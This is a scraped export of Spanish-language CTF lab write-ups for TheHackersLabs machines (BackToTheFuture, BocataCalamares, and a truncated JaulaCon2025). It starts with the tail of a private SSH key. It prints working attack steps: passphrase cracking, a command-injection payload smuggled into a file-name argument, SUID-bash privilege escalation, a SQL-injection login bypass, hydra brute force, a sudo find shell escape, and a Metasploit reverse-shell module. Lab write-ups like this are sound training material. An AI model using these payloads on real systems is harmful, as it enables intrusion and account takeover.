5PevDpytUCDfhPFOTHiF9OLee7SZOXwq8qNQCq5bNHbYR4ASZeACUOAX+ULnFo2XHYEd/0 ay5tl/a2rg1kCNjBZWzPpQWUWLHwzfdLzqAFaoJVNa4eoZ0INZ5FpDzPTbjRrwWH1raR+n Oai+vgHQP/9rDUp602dd+h83nfR9D9k2eIt0QEZc2RF26a2t6oeMfAoJpzx+YeBIFb6Hvm pGQ0d3ke5dNL64t5jmUDaXCu4mkytMzXBNVXImKTPNLLJBz5HcAc2RPiP+sV7R9Zu4cLMw bNyLYoM2wkyRr/Hk910Qtkfmi1CVFZn7AQrsSIN72q92Qzb0moQcwpQ2IqQqH0lm/Hy+af xU0+ix1wXpeCAOH4E2y38VFwcESDyIYSMA5LjmMrrYaetqklqZoo83vbPB3R6Z3jXkYZBf MEHZqlMtH4JYbyLHoqqXbxLy3Uw/jgSmr6ieXv2BSRGw3wAflQ59Kf71pDxU7CDtaF8dqY NoXxQ4y/FrddfOHt1Sis76Qw0gYOVEQ6NYzTA+PVtd7V2taxH05Hyleb+JY/jsow9Dy2z8 YLKKaHimIyfXgidYt3lkXmce0RVbJrVpciJXCg4xzNFrZEFMZX9SOz4gVpKR3VviYvaQcP lQvKziHAzFEyCjcwd7r59sU9bOWOsgQWMdYJdpAS9saxvUSd7HEobB8U14kgVthqGnQoTM RACHFSdv1OPaI3XuMQLqVpry1SAKEcaL95q11WJpOGa1PLBUCkUAoSGqC/RwFeoqUb38EQ +lc8/GJfSfzIz74ShfM+MPqH+nKh387UqNWomAyaixyfmHHMYEyf+BH61d/ZvOwCfaO/Is OmLQ8MicIZxQBRz/mhVbrL7fl0GqIQMh/xddKJ9L1ZzJXg7l3CvSwA8+idvDObTwJoTons jHBz+JoWNKlpIz/gHbLbT57XMHroZbM46cMrXXY8DOxVZtCmD6zEHRhPZAZJIMr4sySi2B B29crFrrs7fWLVaFeFeSou02EFE= -----END OPENSSH PRIVATE KEY-----\rTenemos el id_rsa, vamos a copiarlo en nuestra máquina y darle el permiso 600:\n┌──(pylon㉿kali)-[~/Desktop/pylon/THL/BackToTheFuture] └─$ chmod 600 id_rsa\rAl intentar emplear el id_rsa para iniciar como marty por el SSH, vemos que nos pide unas credenciales:\n┌──(pylon㉿kali)-[~/Desktop/pylon/THL/BackToTheFuture] └─$ ssh marty@192.168.44.133 -i id_rsa Enter passphrase for key \u0026#39;id_rsa\u0026#39;:\rProbando las encontradas anteriormente no funcionan, vamos a usar ssh2john para sacar el hash:\n┌──(pylon㉿kali)-[~/Desktop/pylon/THL/BackToTheFuture] └─$ ssh2john id_rsa \u0026gt; rsa_hash\rAhora con john vamos a intentar crackearlo:\n┌──(pylon㉿kali)-[~/Desktop/pylon/THL/BackToTheFuture] └─$ john -w=/usr/share/wordlists/rockyou.txt rsa_hash Using default input encoding: UTF-8 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes Cost 2 (iteration count) is 16 for all loaded hashes Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status metallica1 (id_rsa) 1g 0:00:01:35 DONE (2025-07-20 16:50) 0.01051g/s 50.82p/s 50.82c/s 50.82C/s 2222222..onelove1 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed.\rBien!! Ahora vamos a inciar como marty:\n┌──(pylon㉿kali)-[~/Desktop/pylon/THL/BackToTheFuture] └─$ ssh marty@192.168.44.133 -i id_rsa Enter passphrase for key \u0026#39;id_rsa\u0026#39;: Last login: Sun Jul 20 07:39:55 2025 from 192.168.44.128 -bash-5.2$ whoami marty -bash-5.2$\rShell as docbrown Bien!! Si volvemos a hacer un ls -la en el directorio de marty veremos otra cosa rara:\nbash-5.2$ ls -la total 56 drwxr-xr-x 7 marty marty 4096 Jul 20 11:44 . drwxr-xr-x 4 root root 4096 Jul 12 15:49 .. lrwxrwxrwx 1 root root 9 Jul 13 16:50 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 marty marty 220 Mar 29 2024 .bash_logout -rw-r--r-- 1 marty marty 3552 Jul 12 20:45 .bashrc drwx------ 4 marty marty 4096 Jul 12 20:28 .cache drwxr-xr-x 3 marty marty 4096 Jul 12 20:28 .config -rw-r--r-- 1 marty marty 5290 Jul 12 2023 .face lrwxrwxrwx 1 marty marty 5 Jul 12 2023 .face.icon -\u0026gt; .face -rw-r--r-- 1 docbrown docbrown 80 Jul 12 21:19 .flux_notes drwxr-xr-x 2 root root 4096 Jul 12 19:48 ftp drwxr-xr-x 4 marty marty 4096 Jul 12 20:28 .local -rw-r--r-- 1 marty marty 807 Mar 29 2024 .profile drwx------ 2 marty marty 4096 Jul 14 20:16 .ssh -rw-r--r-- 1 root root 16 Jul 14 20:22 user.txt\rVemos el fichero .flux_notes, vamos a leerlo:\nbash-5.2$ cat .flux_notes Tiempos inestables... aún necesito arreglar el runner para la próxima prueba.\rrunner?.. No entiendo lo que queire decir, seguramente sea una pista. Vamos a intentar ver el home del usuario docbrown:\nbash-5.2$ ls -la total 88 drwxr-xr-x 15 docbrown docbrown 4096 Jul 15 10:45 . drwxr-xr-x 4 root root 4096 Jul 12 15:49 .. lrwxrwxrwx 1 root root 9 Jul 13 16:50 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 docbrown docbrown 220 Jul 11 22:04 .bash_logout -rw-r--r-- 1 docbrown docbrown 3662 Jul 12 20:23 .bashrc drwx------ 10 docbrown docbrown 4096 Jul 11 22:27 .cache drwx------ 9 docbrown docbrown 4096 Jul 12 20:41 .config drwxr-xr-x 2 docbrown docbrown 4096 Jul 11 22:08 Desktop drwxrwxrwx 2 docbrown docbrown 4096 Jul 12 20:49 docs drwxr-xr-x 2 docbrown docbrown 4096 Jul 11 22:08 Documents drwxr-xr-x 2 docbrown docbrown 4096 Jul 11 22:08 Downloads -rw-r--r-- 1 docbrown docbrown 5290 Jul 11 22:04 .face lrwxrwxrwx 1 docbrown docbrown 5 Jul 11 22:04 .face.icon -\u0026gt; .face -rw-r--r-- 1 docbrown docbrown 110 Jul 13 14:10 .flux_hint drwx------ 4 docbrown docbrown 4096 Jul 11 22:08 .local drwx------ 4 docbrown docbrown 4096 Jul 11 22:27 .mozilla drwxr-xr-x 2 docbrown docbrown 4096 Jul 11 22:08 Music drwxr-xr-x 2 docbrown docbrown 4096 Jul 11 22:08 Pictures -rw-r--r-- 1 docbrown docbrown 807 Jul 11 22:04 .profile drwxr-xr-x 2 docbrown docbrown 4096 Jul 11 22:08 Public drwxr-xr-x 2 docbrown docbrown 4096 Jul 11 22:08 Templates drwxr-xr-x 2 docbrown docbrown 4096 Jul 11 22:08 Videos -rw------- 1 docbrown docbrown 817 Jul 13 12:52 .viminfo\rVemos el fichero .flux_hint, vamos a leerlo:\nbash-5.2$ cat .flux_hint He estado trabajando en una nueva forma de sincronizar los scripts del sistema. Cada minuto... como un reloj.\rVemos que comenta un supuesto script que se ejecuta cada minuto, vamos a usar pspy:\nbash-5.2$ ./pspy64 pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d ██▓███ ██████ ██▓███ ▓██ ██▓ ▓██░ ██▒▒██ ▒ ▓██░ ██▒▒██ ██▒ ▓██░ ██▓▒░ ▓██▄ ▓██░ ██▓▒ ▒██ ██░ ▒██▄█▓▒ ▒ ▒ ██▒▒██▄█▓▒ ▒ ░ ▐██▓░ ▒██▒ ░ ░▒██████▒▒▒██▒ ░ ░ ░ ██▒▓░ ▒▓▒░ ░ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░ ░ ██▒▒▒ ░▒ ░ ░ ░▒ ░ ░░▒ ░ ▓██ ░▒░ ░░ ░ ░ ░ ░░ ▒ ▒ ░░ ░ ░ ░ ░ ░ Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive) Draining file system events due to startup... done 2025/07/20 11:55:32 CMD: UID=1001 PID=1713 | ./pspy64 2025/07/20 11:55:32 CMD: UID=1001 PID=1686 | bash [..] 2025/07/20 11:56:01 CMD: UID=0 PID=1722 | /bin/sh -c /usr/local/bin/flux_admin.sh 2025/07/20 11:56:01 CMD: UID=0 PID=1723 | /bin/sh /usr/local/bin/flux_admin.sh\rVemos un script llamado flux_admin.sh, vamos a hacer un ls -l para ver que permisos tiene:\nbash-5.2$ ls -l /usr/local/bin/ total 36 -rwxr-xr-x 1 root root 16200 Jul 12 20:49 backup_runner -rwxr-xr-x 1 root root 20 Jul 20 07:52 flux_admin.sh -rwx------ 1 root root 16296 Jul 14 20:44 time_daemon\rVemos varios scripts\u0026hellip; ejecutandolos no consigo gran cosa. Vamos a usar linPEAS:\nmarty@hillvalley:~$ ./linpeas.sh [..] /usr/local/bin/backup_runner cap_setuid=ep /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep /usr/bin/ping cap_net_raw=ep [..]\rVemos que el binario backup_runner tiene cap_setuid=ep, vamos a intentar a busar de el. Vamos a ejecutarlo a ver que ocurre:\nmarty@hillvalley:~$ /usr/local/bin/backup_runner Usage: backup_runner \u0026lt;filename\u0026gt;\rVemos que solicita que añadamos otro campo, en este caso un archivo. Y si intento ejecutar un comando ahí?\nPayload\r\u0026#34;; whoami;\u0026#34;\rVamos a probarlo:\nmarty@hillvalley:~$ /usr/local/bin/backup_runner \u0026#34;; whoami;\u0026#34; tar: Cowardly refusing to create an empty archive Try \u0026#39;tar --help\u0026#39; or \u0026#39;tar --usage\u0026#39; for more information. docbrown sh: 1: -backup.tar.gz: not found\rVemos que ahí se ejecutó el whoami dando como resultado docbrownp, vamos a darnos una bash:\nmarty@hillvalley:~$ /usr/local/bin/backup_runner \u0026#34;; /bin/bash;\u0026#34; tar: Cowardly refusing to create an empty archive Try \u0026#39;tar --help\u0026#39; or \u0026#39;tar --usage\u0026#39; for more information. docbrown@hillvalley:~$ whoami docbrown\rShell as root Vamos a ver si el usuario docbrown tiene algún permiso SUDOERS:\ndocbrown@hillvalley:~$ sudo -l Matching Defaults entries for docbrown on hillvaley: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty User docbrown may run the following commands on hillvaley: (root) NOPASSWD: /usr/local/bin/time_daemon\rVamos a ejecutarlo a ver que ocurre:\ndocbrown@hillvalley:~$ sudo /usr/local/bin/time_daemon [FLUX] No existe el archivo /tmp/sync: No such file or directory\rVemos que intenta apuntar a un archivo llamado sync en el directorio /tmp/ lo vamos a crear y dentro intentaremos dar permisos suid a /bin/bash:\n/tmp/sync\recho \u0026#34;chmod u+s /bin/bash\u0026#34; \u0026gt; /tmp/sync\rAhora vamos a ejecutar time_daemon:\ndocbrown@hillvalley:~$ sudo /usr/local/bin/time_daemon [88MPH] Sincronización completada. Listo para viajar.\rAhora esperaremos un rato ya que hay una tarea cron configurada que ejecuta el script indicado como root. Despues de esperar un rato si hacemos un ls -la a /bin/bash veremos lo siguiente:\ndocbrown@hillvalley:~$ ls -la /bin/bash -rwsr-xr-x 1 root root 1265648 Apr 18 19:47 /bin/bash\rAhora solo iniciaremos una bash como privilegiado (-p):\ndocbrown@hillvalley:~$ bash -p bash-5.2# whoami root\rroot! ;)\n","date":"2025-07-20","id":10,"permalink":"/writeups/thehackerslabs/backtothefuture/","summary":"Enumeration Vamos a empezar con un escaneo nmap:\n┌──(pylon㉿kali)-[~/…/pylon/THL/BackToTheFuture/nmap] └─$ nmap -p- --open -sS -n -Pn --min-rate=5000 -vvv 192.168.44.133 Starting Nmap 7.","tags":[],"title":"BackToTheFuture"},{"content":"Enumeration Vamos a empezar con un escaneo nmap:\n┌──(pylon㉿kali)-[~/…/pylon/THL/BocataCalamares/nmap] └─$ nmap -p- --open -sS --min-rate=5000 -n -Pn -vvv 192.168.44.130 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 13:02 CEST Initiating ARP Ping Scan at 13:02 Scanning 192.168.44.130 [1 port] Completed ARP Ping Scan at 13:02, 0.05s elapsed (1 total hosts) Initiating SYN Stealth Scan at 13:02 Scanning 192.168.44.130 [65535 ports] Discovered open port 80/tcp on 192.168.44.130 Discovered open port 22/tcp on 192.168.44.130 Completed SYN Stealth Scan at 13:02, 0.86s elapsed (65535 total ports) Nmap scan report for 192.168.44.130 Host is up, received arp-response (0.000056s latency). Scanned at 2025-07-19 13:02:58 CEST for 1s Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 64 80/tcp open http syn-ack ttl 64 MAC Address: 00:0C:29:6B:B7:3D (VMware) Read data files from: /usr/share/nmap Nmap done: 1 IP address (1 host up) scanned in 1.06 seconds Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)\rVale ahora vamos a realizar un segundo escaneo para ver que servicios y versiones corren en ellos:\n┌──(pylon㉿kali)-[~/…/pylon/THL/BocataCalamares/nmap] └─$ nmap -p22,80 -sCV 192.168.44.130 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 13:03 CEST Nmap scan report for 192.168.44.130 Host is up (0.00015s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 a6:3f:47:73:4c:6d:b3:23:29:fa:f8:1f:1d:42:44:b9 (ECDSA) |_ 256 11:b8:dc:df:a9:c1:9f:b5:8f:55:93:a4:ef:65:c8:d5 (ED25519) 80/tcp open http nginx 1.24.0 (Ubuntu) |_http-title: AFN |_http-server-header: nginx/1.24.0 (Ubuntu) MAC Address: 00:0C:29:6B:B7:3D (VMware) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 6.39 seconds\rBien, vamos a acceder a la aplicación web:\nVemos que es una aplicación web simple donde no hay gran cosa a simple vista ni a nivel de código fuente. Vamos a realizar fuzzing:\n┌──(pylon㉿kali)-[~/…/pylon/THL/BocataCalamares/nmap] └─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u \u0026#34;http://192.168.44.130/FUZZ\u0026#34; -e .php,.html,.txt,.js /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://192.168.44.130/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt :: Extensions : .php .html .txt .js :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ images [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 1ms] index.php [Status: 200, Size: 4145, Words: 898, Lines: 96, Duration: 5ms] login.php [Status: 200, Size: 2543, Words: 743, Lines: 98, Duration: 3ms] admin.php [Status: 200, Size: 359, Words: 22, Lines: 14, Duration: 2ms]\rVemos un login.php y admin.php, vamos al login.php:\nShell as superadministrator Vemos un mensaje que dice Página en desarrollo, no entrar !!!, vamos a probar un SQLi:\ntest\u0026#39;\rVemos que se acontece el error de la consulta y nos muestra el propio error, posiblemente la query que emplee sea como la siguiente:\nSELECT * FROM users WHERE username = \u0026#39;$input_name\u0026#39; AND password = \u0026#39;$input_password\u0026#39;;\rVemos que podría usar el operador AND lo que significa que ambas condiciones tienen que devolver true, pero\u0026hellip; y si comentamos la parte del AND y añadimos un operador OR?\nSi realizamos eso la consulta sería:\nPayload\rConsulta\rtest\u0026#39; or 1=1-- -\rSELECT * FROM users WHERE username = \u0026#39;test\u0026#39; or 1=1-- -\u0026#39; AND password = \u0026#39;$input_password\u0026#39;;\rEsto ocasionará una modificación de lógica de la consulta devolviendo true ya que si el usuario no es válido devolverá false pero como 1=1 siempre devolverá true y el operador OR devuelve la consulta true si al menos una de ambas condiciones lo devuelve (como es el caso).\nAsí que como resultado será un bypass de la autentificación:\nBien leyendo un poco lo que hay en la web vi una redirección a un archivo llamado todo-list.php:\nVemos el siguiente mensaje:\nHe creado una nueva página para poder leer los ficheros internos del servidor, cada día soy un mejor programador. Además he codificado su nombre en base64, así nadie podrá dar con ella (lee_archivos). Comenta que ha codificado en base64 el nombre del archivo, entre parentesis nos dan el nombre leer_archivos vamos a codificarlo y probar:\n┌──(pylon㉿kali)-[~/…/pylon/THL/BocataCalamares/nmap] └─$ echo \u0026#34;lee_archivos\u0026#34; | base64 bGVlX2FyY2hpdm9zCg==\rVamos a probar a apuntar a un archivo llamado bGVlX2FyY2hpdm9zCg==.php:\nBien!! Vemos que nos indica que podemos buscar y leer cualquier archivo de la máquina, vamos a probar el /etc/passwd:\nVemos que funciona, vamos a intentar ver si podemos leer el id_rsa del usuario superadministrator:\nNo podemos, vamos intentar hacerle fuerza bruta por el SSH a superadministrator. Para ello emplearemos hydra:\n┌──(pylon㉿kali)-[~/…/pylon/THL/BocataCalamares/nmap] └─$ hydra -l superadministrator -P /usr/share/wordlists/rockyou.txt ssh://192.168.44.130 Hydra v9.5 (c) 2023 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-19 13:34:02 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking ssh://192.168.44.130:22/ [22][ssh] host: 192.168.44.130 login: superadministrator password: princesa 1 of 1 target successfully completed, 1 valid password found [WARNING] Writing restore file because 1 final worker threads did not complete until end. [ERROR] 1 target did not resolve or could not be connected [ERROR] 0 target did not complete Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-19 13:34:29\rBien!! Tenemos sus credenciales, vamos a iniciar sesión por SSH:\n┌──(pylon㉿kali)-[~/…/pylon/THL/BocataCalamares/nmap] └─$ ssh superadministrator@192.168.44.130 superadministrator@192.168.44.130\u0026#39;s password: Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-51-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/pro System information as of Sat Jul 19 11:35:55 AM UTC 2025 System load: 0.02 Processes: 218 Usage of /: 14.6% of 49.21GB Users logged in: 0 Memory usage: 39% IPv4 address for ens33: 192.168.44.130 Swap usage: 0% * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s just raised the bar for easy, resilient and secure K8s cluster deployment. https://ubuntu.com/engage/secure-kubernetes-at-the-edge Expanded Security Maintenance for Applications is not enabled. 1 update can be applied immediately. To see these additional updates run: apt list --upgradable Enable ESM Apps to receive additional future security updates. See https://ubuntu.com/esm or run: sudo pro status The list of available updates is more than a week old. To check for new updates run: sudo apt update Last login: Sat Jul 19 10:58:52 2025 from 192.168.44.128 superadministrator@thehackerslabs-bocatacalamares:~$\rShell as root Si hacemos un ls podremos ver el siguiente archivo:\nsuperadministrator@thehackerslabs-bocatacalamares:~$ ls flag.txt recordatorio.txt\rVamos a leer recordatorio.txt:\nsuperadministrator@thehackerslabs-bocatacalamares:~$ cat recordatorio.txt Me han dicho que existe una pagina llamada gtfobins muy util para ctfs, la dejo aquí apuntada para recordarlo mas adelante.\rVamos a hacer un sudo -l para ver si tenemos algún tipo de permiso sudoers:\nsuperadministrator@thehackerslabs-bocatacalamares:~$ sudo -l Matching Defaults entries for superadministrator on thehackerslabs-bocatacalamares: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User superadministrator may run the following commands on thehackerslabs-bocatacalamares: (ALL) NOPASSWD: /usr/bin/find\rVamos a seguir lo indicado en GTFObins:\nsuperadministrator@thehackerslabs-bocatacalamares:~$ sudo find . -exec /bin/bash \\; -quit root@thehackerslabs-bocatacalamares:/home/superadministrator# whoami root\rroot! ;)\n","date":"2025-07-19","id":11,"permalink":"/writeups/thehackerslabs/bocatacalamares/","summary":"Enumeration Vamos a empezar con un escaneo nmap:\n┌──(pylon㉿kali)-[~/…/pylon/THL/BocataCalamares/nmap] └─$ nmap -p- --open -sS --min-rate=5000 -n -Pn -vvv 192.168.44.130 Starting Nmap 7.","tags":[],"title":"BocataCalamares"},{"content":"Enumeration Vamos a empezar con un escaneo nmap:\n┌──(venv)─(pylon㉿kali)-[~/…/pylon/THL/JaulaCon2025/nmap] └─$ nmap -p- --open -sS -n -Pn -vvv --min-rate=5000 192.168.44.131 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 16:19 CEST Initiating ARP Ping Scan at 16:19 Scanning 192.168.44.131 [1 port] Completed ARP Ping Scan at 16:19, 0.05s elapsed (1 total hosts) Initiating SYN Stealth Scan at 16:19 Scanning 192.168.44.131 [65535 ports] Discovered open port 80/tcp on 192.168.44.131 Discovered open port 22/tcp on 192.168.44.131 Completed SYN Stealth Scan at 16:19, 0.74s elapsed (65535 total ports) Nmap scan report for 192.168.44.131 Host is up, received arp-response (0.00044s latency). Scanned at 2025-07-19 16:19:10 CEST for 1s Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 64 80/tcp open http syn-ack ttl 64 MAC Address: 00:0C:29:0F:FD:9F (VMware) Read data files from: /usr/share/nmap Nmap done: 1 IP address (1 host up) scanned in 0.92 seconds Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)\rVamos a realizar un segundo escaneo para determinar el servicio y versión que corre en cada puerto:\n┌──(venv)─(pylon㉿kali)-[~/…/pylon/THL/JaulaCon2025/nmap] └─$ nmap -p22,80 -sCV 192.168.44.131 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 16:19 CEST Nmap scan report for jaulacon2025.thl (192.168.44.131) Host is up (0.00014s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0) | ssh-hostkey: | 256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA) |_ 256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519) 80/tcp open http Apache httpd 2.4.62 ((Debian)) |_http-title: Bienvenido a Bludit | BLUDIT |_http-generator: Bludit |_http-server-header: Apache/2.4.62 (Debian) MAC Address: 00:0C:29:0F:FD:9F (VMware) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 6.65 seconds\rBien, vamos a ver la aplicación web:\nVemos que no carga correctamente\u0026hellip; seguramente porque haya un dominio configurado. Viendo el código fuente web me encuentro lo siguiente:\nVamos a añadir jaulacon2025.thl en nuestro /etc/hosts:\n127.0.0.1\tlocalhost 127.0.1.1\tkali # The following lines are desirable for IPv6 capable hosts ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters 192.168.44.131 jaulacon2025.thl\rAhora si recargamos la web la veremos normal:\nBien, si nos fijamos podemos ver varias veces el nombre Bludit. Si buscamos lo que es nos encontraremos lo siguiente:\nVemos que es un CMS, vamos a realizar fuzzing con ffuf para ver si encontramos la versión especifica del CMS:\n┌──(venv)─(pylon㉿kali)-[~/…/pylon/THL/JaulaCon2025/nmap] └─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u \u0026#34;http://jaulacon2025.thl/FUZZ\u0026#34; -e .php,.html,.txt,.js /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://jaulacon2025.thl/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt :: Extensions : .php .html .txt .js :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ 0 [Status: 200, Size: 4541, Words: 271, Lines: 137, Duration: 200ms] admin [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 150ms] install.php [Status: 200, Size: 30, Words: 5, Lines: 1, Duration: 6ms] robots.txt [Status: 200, Size: 22, Words: 3, Lines: 2, Duration: 55ms] LICENSE [Status: 200, Size: 1083, Words: 155, Lines: 22, Duration: 0ms]\rVamos a ver install.php:\nNo vemos ninguna información relevante, vamos a ver en robots.txt:\nNada\u0026hellip; Decidí leer la propia documentación de Bludit:\nhttps://docs.bludit.com/en/ Vamos a acceder a ver que hay y si podemos sacar la versión del CMS:\nVemos la carpeta version vamos a entrar:\nAccediendo a metadata.json encontramos lo siguiente:\n{ \u0026#34;author\u0026#34;: \u0026#34;Bludit\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;website\u0026#34;: \u0026#34;https://plugins.bludit.com\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;3.9.2\u0026#34;, \u0026#34;releaseDate\u0026#34;: \u0026#34;2019-06-21\u0026#34;, \u0026#34;license\u0026#34;: \u0026#34;MIT\u0026#34;, \u0026#34;compatible\u0026#34;: \u0026#34;3.9.2\u0026#34;, \u0026#34;notes\u0026#34;: \u0026#34;\u0026#34; }\rEncontramos la versión 3.9,2, vamos a buscar la última versión que hay:\nVemos que esta desactualizado el CMS, vamos a buscar algún posible exploit. Buscando encontré el siguiente CVE:\nhttps://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2019-16113 Pero requerimos de credenciales\u0026hellip; Buscando encontré lo siguiente:\nBludit 3.9.2 - Auth Bruteforce Bypass\rShell as www-data Vamos a usarlo para hacer fuerza bruta:\n┌──(venv)─(pylon㉿kali)-[~/…/pylon/THL/JaulaCon2025/exploits] └─$ python3 Bludit-Auth-Bypass.py -l http://jaulacon2025.thl/admin/ -u /usr/share/wordlists/rockyou.txt -p /usr/share/wordlists/rockyou.txt\rNota\nAl ejecutar por primera vez el Bludit-Auth-Bypass.py os pedirá instalar unos requerimientos, os recomiendo hacerlo en un entorno virtual (venv).\nDespués de un rato no encontró nada\u0026hellip; Recordando en la web estaba el siguiente texto sin más:\nVamos a probar a añadir este usuario en una wordlist y probar nuevamente el script de fuerza bruta:\n┌──(venv)─(pylon㉿kali)-[~/…/pylon/THL/JaulaCon2025/exploits] └─$ python3 Bludit-Auth-Bypass.py -l http://jaulacon2025.thl/admin/ -u users -p /usr/share/wordlists/rockyou.txt [..] [*] ¡ÉXITO! [+] Usar credencial -\u0026gt; Jaulacon2025:cassandra\rEncontró las credenciales correctas!! Vamos a probarlas en el login:\nBien!! Ahora podremos explotar el CVE-2019-16113 encontrado anteriormente, para ello lo explotaremos con metasploit. Vamos a iniciarlo y seleccionar el exploit:\n┌──(venv)─(pylon㉿kali)-[~/…/pylon/THL/JaulaCon2025/exploits] └─$ msfconsole Metasploit tip: Save the current environment with the save command, future console restarts will use this environment again _ _ / \\ /\\ __ _ __ /_/ __ | |\\ / | _____ \\ \\ ___ _____ | | / \\ _ \\ \\ | | \\/| | | ___\\ |- -| /\\ / __\\ | -__/ | || | || | |- -| |_| | | | _|__ | |_ / -\\ __\\ \\ | | | | \\__/| | | |_ |/ |____/ \\___\\/ /\\ \\\\___/ \\/ \\__| |_\\ \\___\\ =[ metasploit v6.4.69-dev ] + -- --=[ 2529 exploits - 1302 auxiliary - 432 post ] + -- --=[ 1672 payloads - 49 encoders - 13 nops ] + -- --=[ 9 evasion ] Metasploit Documentation: https://docs.metasploit.com/ msf6 \u0026gt; search bludit Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/linux/http/bludit_upload_images_exec 2019-09-07 excellent Yes Bludit Directory Traversal Image File Upload Vulnerability Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/http/bludit_upload_images_exec msf6 \u0026gt; use 0 [*] No payload configured, defaulting to php/meterpreter/reverse_tcp msf6 exploit(linux/http/bludit_upload_images_exec) \u0026gt;\rAhora pondremos show options para ver las opciones que solicita para explotar el exploit:\nmsf6 exploit(linux/http/bludit_upload_images_exec) \u0026gt; show options Module options (exploit/linux/http/bludit_upload_images_exec): Name Current Setting Required Description ---- --------------- -------- ----------- BLUDITPASS yes The password for Bludit BLUDITUSER yes The username for Bludit Proxies no A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http RHOSTS yes The target host(s), see 